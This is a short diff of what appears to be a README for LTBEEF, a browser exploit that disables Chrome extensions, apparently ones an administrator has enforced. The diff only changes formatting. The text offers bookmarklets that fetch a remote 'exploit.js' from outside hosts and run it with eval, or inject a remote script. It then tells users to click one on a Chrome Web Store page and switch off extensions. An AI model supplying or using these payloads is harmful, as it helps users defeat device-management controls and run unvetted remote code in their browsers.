@@ -16,9 +16,9 @@ To use a GUI, bookmark one of the below scripts:
 Ingot
 javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
 Compact Cow's UI
-`javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});`
+javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
 Compact Cow's UI (Dark)
-`javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);`
+javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
 Navigate to https://chrome.google.com/webstorex and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!
 
 # DNS servers (LTBEEF)
